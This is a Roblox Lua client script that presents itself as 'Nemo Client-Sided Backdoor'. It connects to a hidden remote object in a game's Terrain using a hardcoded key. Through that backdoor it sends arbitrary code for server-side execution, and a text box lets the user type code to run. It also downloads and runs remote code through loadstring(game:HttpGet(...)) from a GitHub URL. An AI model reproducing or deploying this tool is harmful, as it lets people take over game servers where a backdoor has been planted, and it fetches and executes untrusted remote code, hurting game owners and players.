local Key = "N3M0__Y@y>U,yA-x$[%SP[H @AJ{VEE_prTb" 
local LTSR = game.Workspace.Terrain
local Remote = LTSR["Nemo"]
local Player = game.Players.LocalPlayer
local PlayerName = Player.Name
local RunService = game:GetService("RunService")

local CLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/GrumpyNemo/ScriptsGalore/ROBLOX/ConsoleUILibary.lua",true))()
local LoadServerside = function(plr)
    local Code = ("require(7818103528).GiveGui('"..plr.."')")
    Remote:FireServer(Code,Key)
end

CLib:add("Nemo Client-Sided Backdoor")
CLib:setColor("Red")
CLib:clear()
CLib:infoMessage("Welcome, "..game.Players.LocalPlayer.Name..". To Nemo's Backdoor!")
wait(.3)
CLib:warnMessage("Loading Serverside // Credit to Grumpy Nemo#5103\n")
wait(.2)
CLib:setColor("Light Blue")
CLib:message(PlayerName..', Rank: "')
wait(.1)
CLib:setColor("Blue")
CLib:message("Enjoy your time. :) \n")
wait(.2)
LoadServerside(PlayerName)
wait(.1)
CLib:errorMessage("Please dont abuse!")
CLib:errorMessage("-- Logs -- \n")
CLib:infoMessage("GUI Loaded.")
wait(.3)

    local NemoExecutor = game.Players.LocalPlayer.PlayerGui:WaitForChild("NemoExecutor")
    local ExecuteButton = NemoExecutor.Frame.Frame.Execute
    local TextBox = NemoExecutor.Frame.Frame.TextBox
    ExecuteButton.MouseButton1Down:Connect(function()
        local Script = TextBox.Text
        CLib:setColor("Green")
        CLib:message('  executed:'..TextBox.Text)
        Remote:FireServer(Script,Key)
    end)
    
game.Players.PlayerRemoving:Connect(function(plr)
    if plr.Name == PlayerName then
            CLib:setColor("Red")
        CLib:message("User Disconnected")
    end
end)
